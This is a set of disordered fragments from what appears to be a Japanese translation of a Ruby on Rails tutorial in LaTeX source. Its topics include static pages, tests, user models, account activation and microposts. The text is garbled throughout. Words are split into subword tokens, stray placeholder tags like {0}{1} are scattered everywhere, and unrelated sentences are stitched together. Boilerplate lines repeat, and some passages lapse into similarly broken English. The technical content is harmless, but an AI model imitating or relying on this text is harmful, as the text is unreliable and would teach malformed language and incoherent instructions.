▁Rails コンソール を 起動 し 、 example _ user の コードを \ ko de { require } して 、 自 作 した クラス を 試 し に 使って みましょう 。
▁上のコード で 、 require の パス にある \ ko de { ’ . ’ } は 、 Unix の ▁“ カ レ ン ト ディレクトリ ” ▁( 現在の ディレクトリ ) ▁ を表し 、\ ko de { ’ . / example _ user ’ } という パス は 、 カ レ ン ト ディレクトリ から の 相 対 パス で example _ user ファイルを 探 す ように Ruby に 指示 します 。
▁ 次の コード では 空 の example _ user を作成します 。 次に 、 対応する 属性 に それぞれ 手動で 値を 代入 することで 、 名前 と メールアドレスを 与え ます ▁(\ ko de { {1} リスト 4.1 3 {/1} } で {2} attr _ accessor {/2} を 使用している ので 、 ア ト リ ビュー ト ア ク セ サ を使用して 代入 できます )。
▁\ ko de {@ name } 変数 に \ ko de { " E x am p le ▁User "} という 値 を設定します 。 同様に \ ko de { email } 属性 にも 値 を設定します 。 これらの 値 は \ ko de { formatted _ email } メソッドで 使用されます 。
▁{0}{1} 第 7 章 {/1}{/0} ▁ では 、 ▁ ハッシュ 引数 を使用して オブジェクトを 初期化 します 。 これは 一般に \ emph { マ ス ア サ イン メ ン ト ▁( ma s s ▁as sign m ent ) } ▁ と呼ばれる 技 法 で 、 Rails アプリケーションで 多 用 されています 。
▁{0}{1} 第 5 章 {/1}{/0} では 、 この章 で 学 んだ 内容 を サンプルアプリケーションの 開発 に 活 か していきます 。
▁ { p 0} で作成した {2} example _ user . rb {/2} ファイルは 今後 使用する ことはありません ので 、 削除 してください 。
▁{0}{1} リスト 4.1 4 {/1}{/0} のコード にある 2 つの 疑問符 を 、 それぞれ 適切な メソッド に置き換え て 、 与えられた 文字列 の 文字 を シ ャ ッ フル する 関数 を作成 してください 。 ヒント : ▁\ ko de { s p li t } メソッド 、\ ko de { sh u f f le } メソッド 、\ ko de { join } メソッドを 組み合わせ てみましょう 。
▁ そこで 、 この 先 に進む前に 先 の 2 つの アプリ を 思い 切 って 削除 しておく と よいでしょう 。 アプリ を削除する には 、\ ko de { w or k space } ディレクトリ に移動し て \ ko de { rm ▁- r f ▁ hello _ app / ▁ toy _ app / } コマンド を実行します ( 表 \ ref { table : un i x _ command s })。
▁ サンプルアプリケーション を生成する
▁(\ emph { 注 } : ▁ も し サンプルアプリケーションの 開発 で 必要 になる gem を \ emph { すべて } 知りたい 場合は 、 {1}{2} リスト 11 . 6 7 {/2}{/1} を参照してください 。 これ が 最終的な Gemfile になります )。
▁ Heroku では 、 development 環境 と production 環境 と で 異なる データベース を使用すること を 非推奨 と しています が 、 幸 い にも この サンプルアプリケーション では 両者 の違い は 生 じ ません 。 また 、 SQLite の 方が PostgreSQL よりも ローカル で の インストール や 設定 が \ emph { ず っ と 楽 } なので { p 1 } 、 今回は こ となる データベース を使う ことにします 。
▁{0} 第 {1} 1 {/1} 章 {/0} や {2} 第 {1} 2 {/1} 章 {/2} , ▁I ▁ s ug g e st ▁ following ▁the ▁“ hello , ▁ world ! ”
▁{0} 第 {1} 2 {/1} 章 {/0} でも 指 摘 した とおり 、 主 な 理由 は 、 デフォルトの Rails ページ は Heroku で 破 損 してしまう ことが 多く 、 そのまま だと デプロイ が 成功 した のか 失敗した のか が わかり にくい ためです 。
▁ も し 多数の 静的なページ が 必要 になる 場合は 、\ href { https :// github . com / thoughtbot / h ig h _ v ol tag e }{\ text tt { h ig h _ v ol tag e } } ▁gem ▁ を調べ て みてください 。
▁ コントローラ については { 0} 第 {1} 2 {/1} 章 {/0} でも 簡単に 触 れ ましたが 、\ href { http :// en . w ikipedia . org / wiki / Re present ation al _ S t at e _ Transfer } { 第 {1} 6 {/1} 章 } で 説明 する {3} REST ▁ アーキテクチャ {/3} を 読 む と 理解 が 深 まり ます 。 一 言 で言う と 、 コントローラ とは ▁( 基本的に 動的な ) ▁Web ページの 集合 を 束 ね る コ ン テ ナ の ことです 。
▁ 現在 どの ディレクトリ で 作業 している か が わ から なく な った 場合は 、\ ref { sec : the _ hello _ application } ▁( {2} {1} 図 ▁1. 4 {/1} {/2} ) を 再度 参 照 して 、 Rails ▁ の ディレクトリ 構造 を 確認 してください 。
▁ 静的なページ の作成 は 、\ ko de { 第 {1} 2 {/1} 章 } で scaffold 生成 に 使用 した {2} generate {/2} スクリプト で 、 コントローラ を生成する こと から 始 め ます 。
▁ 先ほど と同様に \ ko de { static _ pages _ controller . rb } という コントローラ が 生成されます 。
▁なお {0}{1} 第 6 章 {/1}{/0} でも 、 以下のように \ emph { モデル } を 自動生成 する方法 を 紹 介 します 。
▁その 理由 については {0}{1} 第 6 章 {/1}{/0} で説明します )。
▁また 、\ emph { {1} 第 2 章 {/1} } でも 簡単に 紹 介 しました が 、 {2} マイグレーション {/2} の 変更を 元に戻す 方法 も 用意されてい ます 。 詳 細 は {3} {1} 第 6 章 {/1} {/3} で説明します 。
▁{0} 図 3.1 {/0} ▁{1} サンプルアプリケーションの \ ko de { config } ディレクトリ の内容 {/1}
▁ 先ほど リスト { p 0} のように {2} home {/2} アクション と {2} help {/2} アクション を生成し たので 、 routes ファイル には それぞれの アクション で 使用される ルール が 定義 されています ▁( リスト \ ref { code : pages _ routes })。
▁\ href { http :// localhost :3000/ static _ pages / home }{/ static _ pages / home } にアクセス して 結果 を表示します ▁( 図 \ ref { fig : raw _ home _ view })。
▁{0} 図 3 .2{/0} ▁{1} \ href { http :// localhost :3000/ static _ pages / home }{/ static _ pages / home } にアクセス した 結果 {/1}
▁Rails を含む 多くの Web フレームワーク は 、 HTTP の 各 操作 を 発 展 させ た \ emph { REST ▁ アーキテクチャ } の 影 響 を 受け ています 。 {1}{2} 第 2 章 {/2}{/1} でも 簡単に 触 れ ましたが 、 {3} {2} 第 7 章 {/2} {/3} では 、 より 深 い 内容 について 学 び ます 。
▁ここで 、 {0}{1} 第 2 章 {/1}{/0} の Users コントローラ や Microposts コントローラ とは 異 なり 、 StaticPages コントローラ は 一般的な REST アクションに 対応 していない ことに注意してください 。
▁しかし 、 Rails では 動作 が 異なります 。 \ ko de { StaticPages Controller } は Ruby ▁ の クラス ですが 、\ ko de { Application Controller } クラス を継承し ている ため 、 StaticPages Controller の メソッドは ▁( たとえ 何も 書かれてい なくても ) ▁Rails 特 有 の 振る舞い を します 。 具体的には 、 / static _ pages / home という URL にアクセス すると 、 Rails は StaticPages コントローラ を参照 し 、\ ko de { home } アクションに 記述 されている コード を実行します 。 その後 、 その アクション に対応する \ emph { ビュー } ▁(\ ref { sec : mvc } で説明した MVC の V に相当 ) ▁ を 出力 します 。
▁{0} . erb {/0} の詳細については { p 1 } で説明します が 、 ファイル名 に { 0} . html {/0} が含まれ ている こと から わ か る 、 基本的に は HTML と同じ ような 構造 になっています ▁( {3} \ ko de { リスト 3 . 7 } {/3} )。
▁\ ko de { help } アクション に対応する ビュー も 、 上のコード と似ています ▁( {1}{2} リスト 3 . 8 {/2}{/1} )。
▁{0} 図 3 . 3 {/0} ▁{1} 修正 された Home ページ {/1}
▁{0} 図 3 . 4 {/0} ▁{1} 修正 された Help ページ {/1}
▁ 本書 における 主要な テストは 、\ emph { コントローラ テスト } ▁( この節 より ) 、\ emph { モデル テスト } ▁( {1} 第 {2} 6 {/2} 章 {/1} より ) 、\ emph { 統合テスト } ▁( {3} 第 {2} 7 {/2} 章 {/3} より ) ▁ の 3 つ です 。
▁ テストスイート は 期待どおり パス ▁GR EEN {0}{1}{/1}{1}{2} {/2} {/1}{1}{/1}{/0} ▁ します
▁\ ko de { about } 用の ルート を追加する ▁ RE D {3} { 4 } {/4} { 4 } { 5 }{/ 5 } {/4} { 4 } {/4} {/3}
▁\ ko de { about } アクション が追加され た StaticPages コントローラ ▁ RE D {3} { 4 } {/4} { 4 } { 5 }{/ 5 } {/4} { 4 } {/4} {/3}
▁ About ページ のコード ▁GR EEN {2}{3}{/3}{3}{4} {/4}{/3}{3}{/3} {/2}
▁もちろん 、 実際に ブラウザ を 起動 して 、 テスト が正しく 動 い ている かどうかを 確かめ る こともできます ▁( {0}{1} 図 3 . 5 {/1}{/0} )。
▁{0} 図 3 . 5 {/0} ▁{1} 作成した About ページ ▁(\ href { http :// localhost :3000/ static _ pages / about }{/ static _ pages / about }) {/1}
▁ タイトル を 自動 で 変え る ぐらい の ことが \ emph { 真 の } 動的 コンテンツ と 呼 べ る かどうか は 議 論 の 余 地 がある と思います が 、 いずれ に し ろ この ページ は 、 {1}{2} 第 7 章 {/2}{/1} で 紹 介 する 本 格 的な 動的 コンテンツ の基礎 となります 。
▁{0} 表 3 .2{/0} ▁{1} サンプルアプリケーションの ▁( ほぼ ) ▁ 静的なページ 。 {/1}
▁ 表 \ ref { table : static _ pages } の 各 タイトル について 簡単な テストを 書き ます ▁( リスト \ ref { code : about _ test })。 この テスト で 使用している \ ko de { assert _ select } メソッド では 、 特定の HTML タグ が存在する かどうか をテストします ▁( この種の アサーション メソッドは その 名 から 「 セ レ ク タ 」 と呼ばれる こともあります )
▁ StaticPages コントローラの タイトル をテストする ▁ RE D {2}{3}{/3}{3}{4} {/4}{/3}{3}{/3} {/2}
▁{0} � 図 3 . 6 ▁{/0}{1} タイトル が 付 いた Home ページ {/1}
▁ The ▁ view ▁for ▁the ▁ Help ▁ page ▁with ▁ full ▁ HTML ▁ structure . ▁ {2}{3}{/3}{3}{4} re d {/4}{/3}{3}{/3} {/2}
▁ 完全な HTML 構造 を 備 え た About ページの ビュー ▁GR EEN {2}{3}{/3}{3}{4} {/4}{/3}{3}{/3} {/2}
▁ タイトル に ERB コード を使用した Home ページの ビュー ▁GR EEN {2}{3}{/3}{3}{4} {/4}{/3}{3}{/3} {/2}
▁{0}{1} リスト 3 . 28 {/1}{/0} は 、\ emph { ERB } と 呼ばれ ている 、 Ruby の 埋め込み コード の最初の 例 です
▁Rails で の 開発 経験 者 であれば 、 この時点で \ ko de { content _ for } の 使用 を 検 討 する と思います が 、 残念ながら Asset ▁Pipeline と 併 用 すると 正常に動作し ない ことがあります 。
▁\ ko de { pro v id e } 関数 は content _ for の 代 替 です 。
▁続いて 、 Help ページ と About ページ も同様に 変更 します ▁( {0}{1} リスト 3 . 30 {/1}{/0} 、 {2} {1} リスト 3 . 3 1 {/1} {/2} )。
▁ タイトル に ERB コード を使用した Help ページの ビュー ▁GR EEN {2}{3}{/3}{3}{4} {/4}{/3}{3}{/3} {/2}
▁ タイトル に ERB コード を使用した About ページの ビュー ▁GR EEN {2}{3}{/3}{3}{4} {/4}{/3}{3}{/3} {/2}
▁ 変更 の 結果 、 レイアウト ファイルは {0}{1} リスト 3 . 3 2 {/1}{/0} のようになります 。
▁上の 3 つの ERB は 、 それぞれ スタイルシート 、 JavaScript 、 { 0} c s r f _ me t a _ tag s {/0} メソッドを ページ 内で 展開 する ためのものです 。 スタイルシート と JavaScript は 、 Asset ▁Pipeline ▁( { p 1 }) ▁ の一部 です 。 c s r f _ me t a _ tag s は 、 Web 攻撃 手法 の ひとつ である \ href { http :// en . w ikipedia . org / wiki / C r o s s - site _ request _ f org e ry } { ク ロ ス サイト リクエスト フ ォ ー ジ ェ リ ー } ▁( c r o s s - site ▁ request ▁for g e ry : ▁ CSRF ) を防ぐ ために 使われ る Rails の メソッド です 。
▁もちろん 、 {0}{1} リスト 3 . 28 {/1}{/0} 、 {2} {1} リスト 3 . 30 {/1} {/2} 、 ▁ {3} {1} リスト 3 . 3 1 {/1} {/3} の ビュー には 、 レイアウト と 重複 する HTML が まだ 残 っている ので 、 それら を削除し て 、 内部 の コンテンツ だけ 残 します 。
▁この 改 修 が 終 わ ると 、 ▁{0}{1} リスト 3 . 3 3 {/1}{/0} 、 {2} {1} リスト 3 . 3 4 {/1} {/2} 、 {3} {1} リスト 3 . 3 5 {/1} {/3} のように 実 に 簡潔 で 美 しい コード になります 。
▁ HTML 構造 を削除し た Home ページ ▁GR EEN {2}{3}{/3}{3}{4} {/4}{/3}{3}{/3} {/2}
▁ HTML 構造 を削除し た Help ページ ▁GR EEN {2}{3}{/3}{3}{4} {/4}{/3}{3}{/3} {/2}
▁ HTML 構造 を削除し た About ページ ▁GR EEN {2}{3}{/3}{3}{4} {/4}{/3}{3}{/3} {/2}
▁( { p 0} で Application コントローラに {2} hello {/2} アクション を追加した 場合は 、 今 のうち に アクション を削除し ておく ことを お す す め します )。
▁ 変更 結果を リスト \ ref { code : home _ root _ route } に示します 。 ここでは 、 リスト { p 2 } の {3} get {/3} ルール を 以下のコード に置き換え ています 。
▁{0} 図 3 . 7 ▁{/0}{1} ルート URL にアクセス すると Home ページ が表示される {/1}
▁次に master ブランチ に移動し 、\ ref { sec : git _ command s } { p 2 } と 同じ要領で 差 分 を マージ します 。
▁ 基本 タイトル を含め た StaticPages コントローラの テスト ▁GR EEN {2}{3}{/3}{3}{4} {/4}{/3}{3}{/3} {/2}
▁これ を行う には \ href { https :// github . com / me t as kill s / mini _ b ack tr a ce }{\ text tt { mini _ b ack tr a ce } } ▁gem ▁( リスト \ ref { code : gemfile _ sample _ app }) ▁ と \ emph { b ack tr a ce ▁ s il en c er } を 組み合わせ ます 。
▁ Guard は 、 ファイル システム の 変更を 監 視 し 、 たとえば \ ko de { static _ pages _ test . rb } ファイル など を変更する と 自動的に テスト を実行し てくれる ツール です 。
▁{0} 図 3 .9{/0} ▁{1} ファイル ナ ビ ゲ ー ター にある ▁( あ まり 目 立 た ない ) ▁ ギ ア の ア イ コ ン {/1}
▁{0} 図 3.1 0 ▁{/0}{1} ファイル ナ ビ ゲ ー ター 内の 隠 し ファイル を表示する {/1}
▁{0} 図 3.1 1 ▁{/0}{1} 隠 れ ている \ ko de { . gitignore } ファイル を表示する {/1}
▁end
▁リスト { p 0} の {2} hello {/2} アクション を 書き 換 え 、「 Hello , ▁ world ! 」 の代わりに 「 h ol a , ▁ m un do ! 」 と 表示される ように してみましょう 。
▁ この問題 の 修正 するには と て つ も なく 複雑な 正規表現 を使う 必要があります が 、 これは 演習 問題 に 回 します ▁( {0}{1} 6 . {/1} 5 {/0} )。
▁\ chapter { To y アプリケーション } ▁% ▁( fold )< n >\ label { cha : a _ toy _ app }< n >< n >
▁このコードは リスト \ ref { code : hello _ action _ redux } で使用されていま した 。 もうひとつ 、
▁続いて この 変更を コミット し 、 Heroku に プッシュ します 。
▁create ▁app
▁create ▁app
▁self を省略した 結果を リスト \ ref { code : first _ migration } に示します 。
▁ これはリスト \ ref { code : rails _ routes } で使用されていま した 。
▁ これはリスト \ ref { code : demo _ microposts _ controller } で使用されていま した 。
▁\ chapter { ユーザーの 更新 ・ 表示 ・ 削除 } ▁% ▁( fold )< n >\ label { cha : updating _ show ing _ and _ de let ing _ users }< n >< n >
▁まずは ユーザーが 自分の プロファイル を 自分 で 更新 できるようにします 。 ここで 早 速 {0}{1} 第 8 章 {/1}{/0} で 実装 した 認 証 用の コード を使います が 、 これは 認 可 モデル について 説明 する 自 然 な キ ッ カ ケ になります 。
▁{0}{1} 第 8 章 {/1}{/0} の 認 証 ▁( authentication ) ▁ システム を 使 えば 、\ emph { before _ action } を使用して これを 行 え ます 。
▁この コードが リスト \ ref { code : signup _ form } と 極めて 似 通 っ ていることに注目してください 。 重複 が多い ということ は 、 それらの コードの 繰り返し を パーシャル に まとめ る ことができる ということです 。 パーシャル に まとめ る 作業 は 演習 の 課題 ▁(\ ref { sec : exercises _ edit _ form }) ▁ に 回 します 。
▁ これはリスト \ ref { code : user _ edit _ view } で使用されていま した 。
▁ これはリスト \ ref { code : new _ edit _ partial } で使用されていま した 。
▁{0}{1} 第 8 章 {/1}{/0} で 認証システム を 構 築 した ことで 、 認 可 のための システム を実装する 準備 も できました 。
▁( このコード のテスト は \ ref { sec : exercises _ friend ly _ forwarding } の 演習 とします )。
▁この節では 、 いよいよ \ href { http :// www . d i c tion ary . com / b row s e / p en ulti ma te } { 最 後 から 2 番目の } ユーザー アクション である \ ko de { index } アクション を追加しましょう 。 この アクション は 、\ emph { すべての } ユーザーを 一覧 表示 します 。
▁リスト \ ref { code : user _ index _ view } では 、\ ref { code : gravatar _ option _ redux } の 演習 の リスト \ ref { sec : exercises _ a _ gravatar _ image } の 結果を 利用 しています 。 これは 、 Gravatar ヘルパー に デフォルト 以外の サイズ を指定する オプションを 渡します 。
▁この 演習 を まだ や って い ない場合は 、 リスト \ ref { code : gravatar _ option _ redux } に従って Users ヘルパー ファイルを 更新 して から 先に 進 んで ください 。
▁このコードは リスト \ ref { code : index _ f in al _ refactoring } で使用されていま した 。 もうひとつ 、
▁ この問題 は 重 大 である ため 、 編集 可能 になって は な らない 属性 に対するテスト を作成する ことを ぜ ひ とも お勧め します 。 \ ko de { admin } 属性 のテスト については 演習 に 回 します ▁(\ ref { sec : exercises _ admin ist r at ive _ users })。
▁\ chapter { ユーザーの マイクロポスト }< n >\ label { cha : user _ microposts }< n >< n >
▁ これはリスト \ ref { code : micropost _ model } で使用されていま した 。
▁ これはリスト \ ref { code : generate _ micropost _ model } で使用されていま した 。
▁ これはリスト \ ref { code : micropost _ user _ id _ validation } で使用されていま した 。
▁ これはリスト \ ref { code : micropost _ valid ity _ test } で使用されていま した 。
▁self を省略した 結果を リスト \ ref { code : micropost _ validations _ tests } に示します 。
▁リスト \ ref { code : user _ profile _ test } では マイクロポストの 投 稿 数 をチェックする ために 、\ ko de { {1} 第 10 章 {/1} } の 演習 ( \ ref { cha : password _ reset }) で紹介した { 4 } response . body {/4} を使っています 。
▁\ ko de { if } - \ ko de { else } 分 岐 を使用して コードを 書き 分 け ている 点が 少し 汚 い ですが 、 このコード の ク リ ー ン アップ は 演習 に 回 す ことにします ▁(\ ref { sec : exercises _ creat ing _ microposts })。
▁( 次 章 で 完全な フィード を実装する ため ) ▁ 今回は { p 0} で紹介した {2} where {/2} メソッドで これを 実現 します 。 {2} Micropost {/2} モデル に変更 を加え た 結果を 、 リスト \ ref { code : proto _ status _ feed } に示します
▁ 画像 アップロード に対するテスト は 、 演習 に 回 します ▁(\ ref { sec : exercises _ basic _ image _ upload })。
▁ これはリスト \ ref { code : skip _ re size _ initialize r } で使用されていま した 。
▁ これはリスト \ ref { code : generate _ user _ mailer } で使用されていま した 。
▁上のコード が 動作 するために 必要な � パスワード再設定 用 メイラー メソッドは 、\ ref { sec : account _ activation _ email s } で 開発 した アカウント有効化 用 メイラー メソッドと ほぼ 同じです 。
▁ アカウント有効化 メール の場合 ▁(\ ref { sec : account _ activation _ email s }) ▁ と同様 、 Rails の メール プレビュー 機能 で パスワード再設定 の メール を プレビュー しましょう 。
▁self を省略した 結果を リスト \ ref { code : password _ reset _ mailer _ test } に示します 。
▁ これはリスト \ ref { code : password _ reset _ mailer _ test } で使用されていま した 。
▁ これはリスト \ ref { code : password _ reset _ update _ action } で使用されていま した 。
▁( 確認 のために 2 時間 も 待 って い られ ないので 、 テスト には もうひとつ 分 岐 を追加します が 、 これは \ ref { sec : exercises _ updating _ the _ reset } の 演習 に 回 す ことにします )。
▁ これはリスト \ ref { code : update _ column s } で使用されていま した 。
▁リスト \ ref { code : s end g r id _ config _ redux } に示した とおり 、 本番 Web サイトの アドレス を \ ko de { host } 変数 に 定義 する 必要 もあります 。
▁置き換えた結果を {0}{1} リスト 4 .3{/1}{/0} に示します 。
▁ これはリスト \ ref { code : account _ activation s _ route } で使用されていま した 。
▁このコードは リスト \ ref { code : user _ model _ activation _ code } で使用されていま した 。 もうひとつ 、
▁self を省略した 結果を リスト \ ref { code : generate _ user _ mailer } に示します 。
▁self を省略した 結果を リスト \ ref { code : c g i _ es ca p e } に示します 。
▁リスト \ ref { code : account _ activation _ view _ text } や リスト \ ref { code : account _ activation _ view _ html } で定義した テンプレート の 実際の 表示 を簡単に 確認 するために 、\ emph { メール プレビュー } という 裏 技 を使って みましょう 。 Rails では 、 特殊な URL にアクセス すると メールの メッセージ を その 場 で プレビュー することができます 。 メール を 実際に 送信 し なくても よい ので 大 変 便利です 。
▁ development サーバーを再起動 して リスト \ ref { code : development _ email _ settings } の設定 を 読み 込 んだ ら 、 次 は { p 2 } で 自動生成 した User メイラー の {3} プレビュー ファイル {/3} の 更新 が必要です ▁( リスト \ ref { code : generated _ user _ mailer _ preview s })。
▁self を省略した 結果を リスト \ ref { code : test _ do main _ host } に示します 。
▁ これはリスト \ ref { code : re al _ account _ activation _ test } で使用されていま した 。
▁ production 環境で 実際に メール 送信 する方法について は \ ref { sec : activation _ email _ in _ production } で説明します 。
▁ここで 、 有効化トークン と メール を それぞれ { 0} params [: id ] {/0} と { 0} params [: email ] {/0} で 参 照 できる ▁( { p 1 }) ▁ ことを 思い 出 してみましょう 。
▁つまり 、 上のコード は 以下 と 等 価 です 。
▁( 改良 すべき 点 として 、 有効化 されていない ユーザー が表示され ないように する 必要 も ある のですが 、 これは \ ref { sec : exercises _ activation _ test _ and _ refactoring } の 課題 に 回 す ことにします )。
▁{0} 図 12 .2{/0} ▁{1} フォロー する 相手 を見つけ る {/1}
▁{0} 図 12 . 3 {/0} ▁{1} ユーザーの プロフィール画面 に ▁[ Follow ] ▁ ボタン が表示されている {/1}
▁{0} 図 12 . 4 {/0} ▁{1} プロフィール に ▁[ U n follow ] ▁ ボタン が表示され 、 フォロワー の カウント が 1 つ 増え た {/1}
▁{0} 図 12 . 5 {/0} ▁{1} Home ページに ステータスフィード が表示され 、 フォロー の カウント が 1 増え た {/1}
▁置き換えた結果を {0}{1} リスト 4 .3{/1}{/0} に示します 。
▁ これはリスト \ ref { code : u t il ity _ method _ tests } で使用されていま した 。
▁リスト \ ref { code : has _ many _ following _ through _ pass ive _ relationships } と 違 って 必要 の ない \ ko de { : source } キー を そのまま 残 している のは 、\ ko de { has _ many ▁: following } と の 類 似 性 を 強 調 させる ためです 。
▁ これはリスト \ ref { code : sample _ relationships } で使用されていま した 。
▁2 4 , ▁2 5 , ▁2 6 , ▁ 27 , ▁ 28 , ▁2 9 , ▁3 0, ▁3 1 , ▁3 2, ▁3 3, ▁3 4 , ▁3 5 , ▁3 6 , ▁3 7 , ▁3 8 , ▁3 9 , ▁4 0, ▁4 1 , ▁4 2,
▁\ href { https :// www . code s ch o ol . com /}{ Co de ▁S ch o ol } : ▁ 非常に 多 種 多 様 な プログラミング を 対 話 的に 学習 できる コース
▁{0}{1} 第 10 章 {/1}{/0} では 、 ▁ メールアドレス が \ emph { 本当に } 有効 であることを 確かめ るために 、\ emph { アカウントを有効化する } 機能を サインアップ の 手順 に追加します 。
▁self を省略した 結果を リスト \ ref { code : development _ debug g er } に示します 。
▁ これはリスト \ ref { code : signup _ form _ html } で使用されていま した 。
▁( なお 、 エラーメッセージ に対するテスト は \ ref { sec : exercises _ a _ test _ for _ invalid _ submission } の 演習 に 残 しておきます 。 )
▁ エラーメッセージ が正しく 表示 されている かどうか については 、 演習 として 残 しておきます ▁(\ ref { sec : exercises _ a _ test _ for _ invalid _ submission })。
▁このコードは リスト \ ref { code : post _ signup } で使用されていま した 。 もうひとつ 、
▁ 検索 キー
▁ ちなみに 、 ここに flash のテスト も 追加 しておく と よいでしょう 。 これは 演習 として 残 しておきます ▁(\ ref { sec : exercises _ a _ test _ for _ valid _ submission })。
▁ これはリスト \ ref { code : user _ create _ action } で使用されていま した 。
▁ これはリスト \ ref { code : production _ web server _ config } で使用されていま した 。
▁self を省略した 結果を リスト \ ref { code : pro c file } に示します 。
▁\ chapter { ゼ ロ から デプロイ まで } ▁% ▁( fold )< n >\ label { cha : beginning }< n >< n >
▁ 第 \ ref { cha : fi ll ing _ in _ the _ layout } 章 から 第 \ ref { cha : password _ reset } 章 に かけ て 、 レイアウト 、 ユーザーの データモデル 、 ユーザー登録 認証システム を 順に 作成 し 、 サンプルアプリケーションの 基本的な 部分を 実装します 。
▁< n >< n > ▁\ subsection { 前 提 知 識 } ▁% ▁( fold )< n > ▁\ label { sec : pre r equ i site s }< n >< n > The re ▁are ▁ no ▁ form al ▁ pre r equ i site s ▁to ▁this ▁ book , ▁and ▁the ▁\ emph {
▁\ href { https :// www . code s ch o ol . com /}{ Co de ▁S ch o ol } : ▁ プログラミング を 対 話 的に 学習 できる コース
▁ Turbolinks
▁ これはリスト \ ref { code : install ing _ rails } で使用されていま した 。
▁ 表示 したい 文字列 を返す アクション を定義し たので 、 今度は デフォルトの ページ ▁( 図 \ ref { fig : r id ing _ rails }) ▁ の代わりに この アクション を使用する よう Rails に 指示 します 。
▁ Capybara の 文法 は 以下のような感じ です 。
▁ これはリスト \ ref { code : hello _ root _ route } で使用されていま した 。
▁ 基 礎 に 基 づ いた ウ ェ ブ 開発 に 重 点 を 置 き ながら ( Rails だけ に 偏 る の ではなく ) 、\ r or t \ は \ emph { 高 度 技術 力 } を学ぶ ための 幅 広 い ス キ ル を 身 に 付け る ことができる 。 ( B o x ~ \ ref { as id e : te ch n ical _ s o ph is tic ation }) , \ foo t not e { \ x k cd us e . } ▁ そして 、 高 度 技術 力 の 主要な 理 念 は ▁\ let b d \ ▁ チュートリアル から 派 生 しています 。 \ foo t not e { learn e no ug h . com / s to ry } ▁ 特に 、 この ▁ L e ar n ▁ E no ug h ▁in tr o d u c to ry ▁ s equ en ce ▁ には \ r or t を 読み 始 め る 前に 知 っ ておく べ き 適 した 内容 が含まれ ている 。 が 必 須 条件 のように 、 例 えば 、 ▁\ le c l 、\ foo t not e { learn e no ug h . com / command - line } ▁ には ( 現在の チュートリアル には ない ) 初心者 向け の内容 で 書かれてい ます 。 < n >< n >< n >\ begin { as id e }< n >\ label { as id e : te ch n ical _ s o ph is tic ation }< n >\ head ing { T e ch n ical ▁ s o ph is tic ation }< n >< n >\ r or t \ ▁ は ▁\ let b d \ ▁ チュートリアル の 仲 間 のような 本 です 。 な ぜ なら 、 これらの チュートリアル は 一 つの テ ー マ を元に して 書かれ た からです 。 その テ ー マ は 、 ▁\ emph { 高 度 技術 力 } : ▁ ハ ー ド と ソ フ ト ス キ ル を 用 い ること によって 、 どんな に 高度な 技術 でも これらの ス キ ル 合わせ る ことにより 、 魔 法 のように 解決 出 来 るように 思える ことです 。 ▁( F ig ur e ~ \ ref { fig : te ch _ support _ ch e at _ sh e e t })。 ▁ ウ ェ ブ 開発 の中で は 、 プログラミング は 必要な 高 度 技術 力 ですが 、 それ 以外に も アプリ の メニュー を 選択 する ことにより 得られ る 、 能 力 を 十分 に 活用 したり 、 分 から ない ぶ ぶ を
▁ メッセージ を ▁\ href { http :// l m g t f y . com /}{ グ ー グ ル して み たり } 、 または 、 諦 め て 再 起動 して み たり 、 っ と 色 々 あり あ ます 。 < n >< n > ウ ェ ブ アプリ には 様 々 な 動的 機能 があります 、 それら は 、 高 度 技術 力 を 成 長 させる ための き か い に つ な が ります 。 Rails の ウ ェ ブ 開発 では 、 < n > ▁ In ▁the ▁ con text ▁of ▁Rails ▁ web ▁ development , ▁ some ▁ spec if i c ▁ example s ▁of ▁ te ch n ical ▁ s o ph is tic ation ▁ include ▁ ma k ing ▁ s ur e ▁you ' re ▁ us ing ▁the ▁ right ▁Ruby ▁gem ▁ version s , ▁run n ing ▁\ text tt { bundle ▁install } ▁ or ▁\ text tt { bundle ▁ update } , ▁and ▁ re start ing ▁the ▁ local ▁ web server ▁if ▁ some th ing ▁do es n ' t ▁ w or k . ▁( D on ' t ▁ w or ry ▁if ▁ all ▁this ▁ s ound s ▁ li ke ▁ g i b b e ri sh ; ▁we ' ll ▁ co ver ▁ e ver y th ing ▁ me n tion ed ▁ her e ▁in ▁the ▁c our s e ▁of ▁ com p let ing ▁this ▁ tutorial . )< n >< n > A s ▁you ▁ pro ce ed ▁ through ▁this ▁ tutorial , ▁in ▁ all ▁ li ke li h oo d ▁you ▁ will ▁ o c ca s ion all y ▁be ▁ tr ip p ed ▁ up ▁ by ▁ th ing s ▁ not ▁ im media te ly ▁ working ▁as ▁ ex p e ct ed . ▁A l th o ug h ▁ some ▁ part i c ul ar ly ▁t ri c k y ▁ st e p s ▁are ▁ ex p li c it ly ▁ h ig h li g h t ed ▁in ▁the ▁ text , ▁it ▁is ▁ im p o s s i b le ▁to ▁ an tic ip at e ▁ all ▁the ▁ th ing s ▁that ▁c an ▁ g o ▁ w r on g . ▁I ▁ re com m end ▁you ▁ e m br a ce ▁the s e ▁in e v i table ▁ st um b l ing ▁ block s ▁as ▁ o p port un it ies ▁to ▁ w or k ▁on ▁ im pro v ing ▁your ▁ te ch n ical ▁ s o ph is tic ation . ▁ O r , ▁as ▁we ▁ s a y ▁in ▁\ href { https :// www . learn e no ug h . com / command - line - tutorial # as id e - s p e a k _ g e e k } { g e e k ▁ s p e a k } : ▁\ emph { I t ' s ▁ not ▁a ▁ b ug , ▁it ' s ▁a ▁f e at ur e ! }< n >< n >\ end { as id e }< n >< n >\ begin { figure }< n >\ begin { center }< n >\ image { images / figure s / te ch _ support _ ch e at _ sh e e t . png }< n >\ end { center }< n >\ ca p tion { ` ` \ href { https :// m . x k cd . com / 6 27 /}{ T e ch ▁Support ▁C h e at ▁S h e e t } ' ' ▁( v i a ▁\ href { http :// x k cd . com /}{ x k cd }) . ▁\ label { fig : te ch _ support _ ch e at _ sh e e t } }< n >\ end { figure }< n >< n >< n > The ▁\ emph {
▁{0} 第 {1} 5 {/1} 章 {/0} から {2} 第 {1} 10 {/1} 章 {/2} に かけ て 、 レイアウト 、 ユーザーの データモデル 、 ユーザー登録 / 認証システム を 順に 作成 し 、 サンプルアプリケーションの 基本的な 部分を 実装します 。
▁\ href { https :// www . code s ch o ol . com /}{ Co de ▁S ch o ol } : ▁ プログラミング を 対 話 的に 学習 できる コース
▁ これはリスト \ ref { code : rails _ command } で使用されていま した 。
▁self を省略した 結果を リスト \ ref { code : new _ read me } に示します 。
▁\ chapter { ユーザーの モデル を作成する } ▁% ▁( fold )< n >\ label { cha : modeling _ users }< n >< n >
